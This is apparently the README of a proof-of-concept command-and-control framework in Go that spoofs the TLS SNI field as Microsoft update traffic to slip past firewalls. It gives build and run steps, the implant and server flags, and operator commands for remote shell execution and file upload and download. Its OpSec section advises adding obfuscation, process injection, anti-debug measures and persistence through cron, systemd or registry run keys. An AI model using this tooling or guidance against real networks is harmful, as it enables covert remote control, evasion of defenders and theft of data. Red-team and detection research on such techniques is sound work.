# SNI Spoof C2

A proof-of-concept command & control (C2) framework that abuses TLS Server Name Indication (SNI) spoofing to evade network-level detection.

## How It Works

Most enterprise firewalls and DPI engines inspect the TLS **SNI** field in the ClientHello to classify traffic. If they see `update.windows.com` or `google.com`, they allow it.

**This C2 weaponises that trust:**

1. The **implant** sets the SNI to a legitimate domain (default `update.windows.com`) in its TLS ClientHello.
2. The implant actually connects to the *C2 server's IP address*.
3. A network tap / firewall sees the SNI and thinks it's Microsoft traffic — **passes**.
4. The **C2 server** accepts any SNI (no validation) and services the connection.
5. The server reads the HTTP-layer Host header (or in this implementation, a JSON protocol over the TLS tunnel) to route the session.

```
Implant                                   C2 Server
   │                                        │
   │  TLS ClientHello                       │
   │  SNI = update.windows.com  ✈️          │
   │  Destination = C2_IP:8443              │
   │───────────────────────────────────────>│  🔓 Accepts ANY SNI
   │                                        │
   │  ── TLS handshake (self-signed) ──►    │
   │                                        │
   │  {beacon}                              │
   │───────────────────────────────────────>│  Logs: SNI=update.windows.com
   │                                        │
   │  {command: "exec", payload: "whoami"}  │
   │<───────────────────────────────────────│
   │                                        │
   │  {result: output: "root\n"}            │
   │───────────────────────────────────────>│
```

> **OpSec note:** This is a technique, not a silver bullet. Modern TLS fingerprinting (JA3, JA4) can classify TLS stacks regardless of SNI. See [OpSec Notes](#opsec-notes).

## Protocol

After the TLS handshake, the implant and server communicate using **newline-delimited JSON** over the encrypted channel:

| Direction | Message | Fields |
|-----------|---------|--------|
| Implant → Server | Beacon | `type`, `hostname`, `pid`, `beacon_id`, `sni` |
| Server → Implant | Command | `type` (`exec`, `upload`, `download`, `beacon`, `ping`, `noop`), `payload`, `filename`, `data`, `beacon_sec`, `id` |
| Implant → Server | Result | `type`, `command_id`, `output`, `data`, `error` |

The implant polls the server at a configurable interval (default 10s, with ±20% jitter). If no command is pending, the server responds with a `noop`.

## Build

Requirements: **Go 1.21+** (tested with Go 1.26).

```bash
# Clone / enter the directory
cd c2-suite/c2-sni-spoof

# Build both binaries
go build -o bin/server ./cmd/server/
go build -o bin/client ./cmd/client/

# Or build everything
go build -o bin/ ./cmd/...
```

The binaries will be placed in `bin/`:
- `bin/server` — the C2 listener
- `bin/client` — the implant

No external dependencies — pure Go standard library.

## Quick Start (Local Test)

Run everything on the same machine for testing:

**Terminal 1 — Start the server:**
```bash
cd c2-suite/c2-sni-spoof
./bin/server -bind 127.0.0.1:8443
```

On first run, it auto-generates `ca.crt`, `server.crt`, and `server.key` in the current directory.

**Terminal 2 — Start the implant:**
```bash
cd c2-suite/c2-sni-spoof
./bin/client -c2 127.0.0.1:8443 -sni update.windows.com -ca ca.crt -beacon 5
```

The implant will connect, you'll see the connection accepted in the server terminal along with the logged SNI.

**Interact** in the server terminal:
```
> clients
  ID       Hostname             SNI                            Last Seen
  ────────────────────────────────────────────────────────────────────────────
  c1       kali                 update.windows.com             5s ago

  selected: client c1 (kali)

> select c1
selected client c1 (kali)

> exec whoami
queued exec #1 on c1: whoami
[→] result from c1 (cmd #1):
root

> exec uname -a
queued exec #2 on c1: uname -a
[→] result from c1 (cmd #2):
Linux kali 6.19.11+kali-cloud-amd64 #1 SMP PREEMPT_DYNAMIC ...

> beacon 30
queued beacon interval change to 30s
```

## Server Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-bind` | `0.0.0.0:8443` | Listen address and port |
| `-cert` | `server.crt` | TLS certificate file (auto-generated if missing) |
| `-key` | `server.key` | TLS private key file (auto-generated if missing) |
| `-ca` | `ca.crt` | CA certificate file (auto-generated if missing) |

## Client Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-c2` | *(required)* | C2 server address in `host:port` format |
| `-sni` | `update.windows.com` | SNI domain to advertise in TLS ClientHello |
| `-ca` | `ca.crt` | CA certificate for TLS verification (optional; falls back to `InsecureSkipVerify`) |
| `-beacon` | `10` | Beacon interval in seconds (±20% jitter) |

## Server Commands

| Command | Description |
|---------|-------------|
| `help` | Show available commands |
| `clients` / `ls` | List connected implants |
| `select <id>` | Select an implant by ID (`c1`, `c2`, …) |
| `exec <command>` | Execute a shell command on the selected implant |
| `upload <local> <remote>` | Upload a file from local machine to the implant |
| `download <remote>` | Download a file from the implant (result printed to server stderr) |
| `beacon <seconds>` | Change the beacon interval of the selected implant |
| `ping` | Ping the selected implant (liveliness check) |
| `exit` / `quit` | Shut down the server |

## OpSec Notes

1. **SNI spoofing bypasses shallow inspection** — Many enterprise firewalls only check the SNI field, making this technique effective against them.

2. **TLS fingerprinting bypasses you** — Modern detection (JA3, JA3S, JA4) fingerprints TLS stack characteristics like cipher suites, extensions, and curve ordering. Your Go TLS ClientHello looks like a Go program, not like Windows Update. Tools like `ja3` on the wire can flag you regardless of SNI.

3. **Self-signed certificate** — A self-signed TLS certificate is suspicious. Even though the firewall may allow the connection based on SNI, a deep packet inspector or EDR can still flag it. Consider:
   - Using a valid certificate for your C2 domain.
   - Pinning to a legitimate CDN or cloud provider.

4. **Beacon jitter** — The implant adds ±20% jitter to the beacon interval to avoid deterministic timing patterns.

5. **Exponential backoff** — On connection loss, the implant doubles the reconnect delay up to 5 minutes, with ±25% jitter. This reduces noise during network outages and avoids reconnection storms.

6. **Memory-only payload** — The implant prints diagnostics to stderr. For operational use, remove debug output and consider adding anti-debug, obfuscation, and process injection.

7. **No persistence** — This implant does not install itself. It's a standalone binary; someone (or another payload) needs to execute it. Add persistence (cron, systemd, registry run key) as needed for your use case.

8. **Detection evasion ≠ secure** — This is a red-team tool for authorised testing. It provides *detection evasion*, not *security*. The communication is encrypted but the implant is not protected against reverse engineering.

## File Structure

```
c2-sni-spoof/
├── go.mod                 # Go module definition
├── README.md              # This file
├── cmd/
│   ├── server/
│   │   └── main.go        # C2 listener
│   └── client/
│       └── main.go        # Implant
├── pkg/
│   └── tls/
│       └── sni.go         # Shared TLS utilities
└── bin/                   # Built binaries (after go build)
```

## License

MIT — For authorised security testing and educational purposes only.
